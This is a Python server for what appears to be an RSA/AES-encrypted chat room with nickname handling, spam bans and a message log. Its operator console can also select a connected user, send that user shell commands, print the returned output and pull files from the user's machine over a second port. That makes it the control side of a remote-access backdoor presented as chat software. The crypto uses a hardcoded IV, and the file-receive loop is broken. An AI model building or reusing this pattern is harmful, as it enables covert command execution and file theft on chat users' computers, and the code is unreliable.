import socket
from termcolor import colored
from threading import Thread
from time import sleep
import rsa
import subprocess, os
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

SECONDS_RANGE = 5
MAX_MESSAGES_PER_SECOND = 1   # 5 messages in SECONDS_RANGE seconds

def target_handler():
    global clients, stop_server, banned_ips
    while True:
        cmd = input("\n$: ").strip()

        if len(cmd) == 0:
            continue 

        if cmd == "ls":
            i = -1
            for i in range(len(clients)):
                client = clients[i]
                print(f"{i}. {client['nickname']} - {client['addr'][0]}:{client['addr'][1]}")
            print(f" -- {i+1} hosts connected --")
        
        elif cmd.startswith("select "):
            user = cmd.split(" ")[-1]
            try:
                user_num = int(user)
                if user_num >= len(clients):
                    print("-> This user does not exists")
                    continue

                target = clients[user_num]

            except ValueError:
                target, i = None, 0
                for client in clients:
                    if client["nickname"] == user:
                        target = clients[i]
                        break
                    i += 1

                if target == None:
                    print("-> This user does not exists")
                    continue

            while cmd != "exit":
                sleep(0.5)      # avoid prompt being printed before command's output
                cmd = input(f"\r{target['nickname']} $: ")
                header = "/output,"

                if cmd == "exit":
                    break
                elif cmd.startswith("download "):
                    cmd = cmd[9:]           # cmd becomes the file name
                    header = "/foutput,"     # means the body is the name of the file to download

                cmd = header + cmd
                try:
                    send_message(cmd, target)   # client should connect to receiver socket
                except OSError:
                    cmd = "exit"
                

        elif cmd == "help":
            print("\t\t\t Print connected users \r ls")
            print("\t\t\t Select user number 'num' \r select <num>")
            print("\t\t\t Send message to user \r send <msg> <user>")
            print("\t\t\t Show the last [n] messages sent by users \r show history [n]")
            print("\t\t\t Show banned user \r show banned")
            print("\t\t\t Ban specified user \r ban <user>")
            print("\t\t\t Unban user_num \r unban <user_num>")
            print("\t\t\t Clear screen \r cls")
            print("\t\t\t Terminate the server \r poweroff")
            print("\t\t\t Print this guide \r help")

        elif cmd.startswith("send "):

            msg = " ".join( cmd.split(" ")[1:-1] )
            user = cmd.split(" ")[-1]
            if user == "*":
                broadcast_clients("admin", msg)
                continue
                
            try:
                user_num = int(user)
                if user_num >= len(clients):
                    print("-> This user does not exists")
                    continue

                target = clients[user_num]

            except ValueError:
                target, i = None, 0
                for client in clients:
                    if client["nickname"] == user:
                        target = clients[i]
                        break
                    i += 1

                if target == None:
                    print("-> This user does not exists")
                    continue
            
            send_message("admin," + msg, target)
        
        elif cmd == "poweroff":
            stop_server = True
            return
        
        elif cmd.startswith("ban "):
            user = cmd.split(" ")[-1]
            try:
                user_num = int(user)
                if user_num >= len(clients):
                    print("-> This user does not exists")
                    continue

                target = clients[user_num]

            except ValueError:
                target, i = None, 0
                for client in clients:
                    if client["nickname"] == user:
                        target = clients[i]
                        break
                    i += 1

                if target == None:
                    print("-> This user does not exists")
                    continue

            target["banned"] = True

        elif cmd == "show banned":
            i = -1
            for i in range(len(banned_ips)):
                print(f"{i}. {banned_ips[i][0]} / {banned_ips[i][1]}")
            print(f" -- {i+1} hosts banned --")
            
        elif cmd.startswith("unban "):
            num = cmd.split(" ")[-1]
            try:
                num = int(num)
                if num > len(banned_ips):
                    print("-> Selection not valid")
                    continue
                ip_to_unban = banned_ips[num]
                banned_ips.remove(ip_to_unban)
                print(f"Unbanned {ip_to_unban[0]} / {ip_to_unban[1]}")
            except ValueError:
                print("-> Selection not valid. Make sure to specify a number")

        elif cmd == "cls":
            try:
                subprocess.run(["cls"])
            except FileNotFoundError:
                subprocess.run(["clear"])
            except Exception:
                print("-> Failed to clear screen")
                continue

            print(colored("=> Server started", "green"))

        elif cmd.startswith("show history"):
            DEFAULT_LINE_NUM = 30
            DATE_LEN = 18
            lines_to_show = cmd.split(" ")[-1]

            try:
                lines_to_show = int(lines_to_show)
            except ValueError:
                lines_to_show = DEFAULT_LINE_NUM

            if not os.path.exists("msg.txt"):
                print(" -- No messages sent --")
                continue

            with open("msg.txt", "r") as log_file:
                history = log_file.readlines()

                if history == None or len(history) == 0:
                    print(" -- No messages sent --")
                    continue
                
                history = list( reversed(history) )
                # If the number of lines we want to see is greater than the number of lines of the file, we need to truncate it
                if len(history) > lines_to_show:
                    history = history[:lines_to_show]
                
                for h in history:
                    time = h[:DATE_LEN]
                    h = h[DATE_LEN:]
                    nick, *msg = h.split(":")
                    msg = "".join(msg)

                    print(
                        colored(f"\t\t\t\t  {msg.strip()}", "yellow"),
                        colored(f"\r {time}", "white", attrs=["dark"]) + colored(f" {nick.strip()}:", "white")
                    )

def wait_for_files():
    HOST = ''
    PORT = 65530

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((HOST, PORT))
        sock.listen(1)
        sock.settimeout(2)

        while not stop_server:
            try:
                conn, addr = sock.accept()
            except (TimeoutError, socket.timeout):
                continue
            
            Thread(target=receive_file, args=(conn,)).start()


def receive_file(conn : socket.socket):
    global RSA_KEY_LEN, private_key
    # receive AES key
    key = rsa.decrypt( conn.recv(int(RSA_KEY_LEN/8)), private_key )
    BUF_SIZE = 66560

    conn.settimeout(None)
    
    msg = conn.recv(BUF_SIZE)
    fname = decrypt_message(key, msg).decode('utf-8', errors='ignore')

    msg = conn.recv(BUF_SIZE)
    fsize = decrypt_message(key, msg).decode('utf-8', errors='ignore')
    fsize = int(fsize)

    GB = 1024**3
    MB = 1024**2
    KB = 1024
    UNIT = "B"
    unit = 1
    if fsize > GB:
        UNIT = "GB"
        unit = GB
    elif fsize > MB:
        UNIT = "MB"
        unit = MB
    elif fsize > KB:
        UNIT = "KB"
        unit = KB

    bytes_received = 0
    unit = 1
    start = datetime.now()
    f = open(f"downloads/{fname}", "wb")
    while bytes_received < fsize:
        packet = decrypt_message( key, conn.recv(BUF_SIZE) )
        if not packet:
            break

        percentage = int( bytes_received/fsize * 100 )

        bar = (f"\r{percentage}% |>") + colored("-" * int( percentage/2 ), "yellow") + (" " * (50 - int(percentage/2) )) + "<| " + str( int(bytes_received/unit) ) + f"{UNIT}/" + str(int(fsize/unit)) + f"{UNIT}"
        print(bar, end="")
        f.write(packet)

    f.close()
    bar = (f"\r100% |>") + colored("-" * 100, "yellow") + "<|" + str(int(fsize/unit)) + f"{UNIT}/" + str(int(fsize/unit)) + f"{UNIT}"
    print(bar, end="")

    finish = datetime.now()
    print(f"\n{finish-start}")
    
    return

def encrypt_message(key : bytes, message : bytes):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CFB, iv)
    ciphertext = cipher.encrypt(message)
    return (iv + ciphertext)

def decrypt_message(key : bytes, ciphertext : bytes):
    iv = b"qwertykiolsksocd"
    cipher = AES.new(key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext

# Send message to specified client
def send_message(data, client):
    client["conn"].sendall( rsa.encrypt(data.encode(), client["key"]) )

def handle_connection(client : dict, conn : socket.socket = None):
    global private_key, RSA_KEY_LEN, stop_thread, stop_server, file_name

    conn = client["conn"]
    addr = client["addr"]
    conn.settimeout(None)

    # --- Wating for nickname
    try:
        nickname = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key).decode('utf-8', errors='ignore')
        if nickname == "/None":     # "/None" means operation aborted
            raise Exception()
    except Exception:
        remove_client(client)
        conn.close()
        return

    if not is_nickname_valid(nickname):
        send_message("/invalid_nickname", client)
        remove_client(client)
        conn.close()
        return

    send_message("/ok", client)

    users.append(nickname)
    client["nickname"] = nickname
    broadcast_clients("/new_user", nickname)

    x = Thread(target=decrement_num_msg_sent, args=[client])
    x.start()

    conn.settimeout(1)
    
    # --- Waiting for messages
    try:
        print(colored(f'[+] {addr} - {nickname} connected', "green"), "\n$: ", end="")

        while not stop_server:
            try:
                # keep it bytes to avoid errors when receiving files
                data = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key)
            except (TimeoutError, socket.timeout):
                if client["banned"]:
                    data = "random"     # this way the program exits instead of continuing
                else:
                    continue

            if not data: continue

            data = data.decode('utf-8', errors='ignore')  
            if data.startswith("/fname,"):
                file_name = data[7:]
                continue

            if data.startswith("/output,"):
                print(data[8:], end="")
                continue

            client["num_msg_sent"] += 1

            # Check for number of messages sent within SECONDS_RANGE seconds
            if is_spam( client["num_msg_sent"] ) or client["banned"]:
                banned_ips.append( tuple(
                    (addr[0],  client["private_addr"])
                ))
                broadcast_clients("/ban", nickname)
                print(colored(f"=> {addr} - {nickname} banned.", "red", attrs=["bold"]))
                raise Exception()
            
            with open("msg.txt", "a") as log_file:
                time = str(datetime.now())[:-10]        # -10 to remove seconds and milliseconds
                log_file.write(f"[{time}] {nickname}:{data}\n")
            
            # send message to all clients. All clients will print their own sent messages by themselves
            broadcast_clients(nickname, data, [client])
    except Exception as e:
        pass
    
    stop_thread = True
    remove_client(client)
    conn.close()
    broadcast_clients("/user_left", nickname, [conn])
    print(colored(f'[-] {addr} - {nickname} disconnected', "red"), "\n$: ", end="")
    return

def is_nickname_valid(nick : str):
    global users
    return not(
        nick.strip() == "" or 
        nick == None or 
        nick.startswith("/") or
        nick.strip() == "admin" or
        nick in users
    )


def is_spam(num_msg_sent):
    return (num_msg_sent / SECONDS_RANGE) > MAX_MESSAGES_PER_SECOND

def decrement_num_msg_sent(client):
    global stop_thread
    while not stop_thread:
        sleep(SECONDS_RANGE)
        if client["num_msg_sent"] > 0:
            client["num_msg_sent"] -= 1
        
# exceptions: clients that don't need to receive the message 
def broadcast_clients(nickname, data, exceptions=[]):
    for client in clients:
        if(client in exceptions): continue

        _data = nickname + "," + data
        try:
            client["conn"].sendall( rsa.encrypt(_data.encode(), client["key"]) )
        except OSError:
            continue
    return

def remove_client(client : dict):
    try:
        nick = client["nickname"]
        clients.remove(client)
        users.remove(nick)
    except:
        pass

def exchange_keys(conn : socket.socket):
    global public_key, clients

    conn.sendall( public_key.save_pkcs1() )
    client_key = rsa.PublicKey.load_pkcs1( conn.recv(1024) )

    private_ip = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key).decode('utf-8', errors='ignore')
    
    client = {
        "conn": conn,
        "addr": None,
        "private_addr": private_ip,
        "nickname": "",                 # nickname is defined in handle_connection()
        "key": client_key,
        "num_msg_sent": 0,
        "banned": False
    }

    clients.append(client)


def main():
    HOST = ''                 # all available interfaces
    PORT = 58465              # Arbitrary port

    global clients
    global users
    clients = []                # array of dictionaries
    users = []

    global banned_ips
    banned_ips = []

    global RSA_KEY_LEN
    RSA_KEY_LEN = 1024

    global public_key, private_key
    public_key, private_key = rsa.newkeys(RSA_KEY_LEN)

    global stop_thread, stop_server
    stop_thread = False
    stop_server = False

    global file_name
    file_name = "recv.txt"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        print(colored("=> Server started", "green"))
        Thread(target=wait_for_files).start()
        s.settimeout(2)
        try:
            target_thread = Thread(target=target_handler)
            target_thread.start()
            s.listen(1)
            while not stop_server:
                try:
                    conn, addr = s.accept()
                except (TimeoutError, socket.timeout):
                    continue

                conn.sendall( public_key.save_pkcs1() )

                exchange_keys(conn)
                client = clients[-1]

                if tuple((addr[0], client["private_addr"])) in banned_ips:
                    send_message("/ban", client)
                    conn.close()
                    continue

                client["addr"] = addr
                data = "/new_user," + ",".join(users)
                send_message(data, client)

                Thread(target=handle_connection, args=(client,)).start()
        
        except KeyboardInterrupt:
            pass
        
        print(colored("=> Server stopped", "red"))
        exit(0)


if __name__ == '__main__':
    main()
